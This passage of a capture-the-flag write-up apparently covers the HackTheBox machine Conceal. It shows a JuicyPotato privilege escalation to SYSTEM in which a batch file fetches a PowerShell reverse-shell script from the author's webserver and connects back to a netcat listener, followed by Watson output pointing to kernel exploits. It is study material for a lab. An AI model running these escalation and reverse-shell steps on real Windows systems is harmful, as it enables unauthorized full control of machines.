Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,256 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,306 MB
Virtual Memory: In Use:    893 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.116
                                 [02]: fe80::4ccb:aafa:2793:40a8
                                 [03]: dead:beef::ccbd:7ffa:69d9:283f
                                 [04]: dead:beef::a947:36cc:c1a8:7109
                                 [05]: dead:beef::4ccb:aafa:2793:40a8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

I can go to the [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato/tree/master/CLSID) and find a [list of CLSIDs for Windows 10 Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise). I’ll try a few that run as “NT AUTHORITY\SYSTEM” until I get one to work.

```

C:\users\Destitute\appdata\local\Temp>jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}                                                                
jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}                                                                                                      
Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 9001
COM -> recv failed with error: 10038

C:\users\Destitute\appdata\local\Temp>jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}                                                                
jp.exe -t * -p \users\Destitute\appdata\local\Temp\rev.bat -l 9001 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}                                                                                                      
Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 9001
......
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

When it does, I get a request on my `python` webserver:

```
10.10.10.116 - - [14/Jan/2019 19:13:46] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

```

And then a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.116.
Ncat: Connection from 10.10.10.116:49723.
Windows PowerShell running as user CONCEAL$ on CONCEAL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system

```

Now now I’ll grab the root flag:

```

PS C:\Windows\system32> cd /users/administrator/desktop
PS C:\users\administrator\desktop> dir

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/10/2018     23:57             32 proof.txt

PS C:\users\administrator\desktop> type proof.txt
5737DD2E...

```

## Alternative Privesc

### Enumeration

When I checked `systeminfo` above, there were no hotfixes installed:

```

Hotfix(s):                 N/A

```

This box is very unpatched.

### Watson

I’ll build and upload a copy of [Watson](https://github.com/rasta-mouse/Watson). For full details on that process, check out my [Bounty write-up](/2018/10/27/htb-bounty.html#watson).

`watson` shows several potential vulns:

```

PS C:\users\Destitute\appdata\local\temp> .\a.exe
  __    __      _
 / / /\ \ \__ _| |_ ___  ___  _ __
 \ \/  \/ / _` | __/ __|/ _ \| '_ \
  \  /\  / (_| | |_\__ \ (_) | | | |
   \/  \/ \__,_|\__|___/\___/|_| |_|

                           v0.1

                  Sherlock sucks...
                   @_RastaMouse

 [*] OS Build number: 15063
 [*] CPU Address Width: 64
 [*] Process IntPtr Size: 8
 [*] Using Windows path: C:\WINDOWS\System32

  [*] Appears vulnerable to MS16-039
   [>] Description: An EoP exist when the Windows kernel-mode driver fails to properly handle objects in memory.
   [>] Exploit: https://www.exploit-db.com/exploits/44480/
   [>] Notes: Exploit is for Windows 7 x86.

  [*] Appears vulnerable to MS16-123
   [>] Description: The DFS Client driver and running by default insecurely creates and deletes drive letter symbolic links in the current user context, leading to EoP.
   [>] Exploit: https://www.exploit-db.com/exploits/40572/
   [>] Notes: Exploit requires weaponisation.

  [*] Appears vulnerable to CVE-2018-8897
   [>] Description: An EoP exists when the Windows kernel fails to properly handle objects in memory.
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/mov_ss.rb
   [>] Notes: May not work on all hypervisors.

  [*] Appears vulnerable to CVE-2018-0952
   [>] Description: An EoP exists when Diagnostics Hub Standard Collector allows file creation in arbitrary locations.
   [>] Exploit: https://www.exploit-db.com/exploits/45244/
   [>] Notes: None.

  [*] Appears vulnerable to CVE-2018-8440
   [>] Description: An EoP exists when Windows improperly handles calls to Advanced Local Procedure Call (ALPC).
   [>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/alpc_taskscheduler.rb
   [>] Notes: None.

 [*] Finished. Found 5 vulns :)

```

I’ll leave it as an exercise for the reader to try some of these out. I’d recommend finding the GitHub’s with compiled exploits, or switching to Metasploit at this point.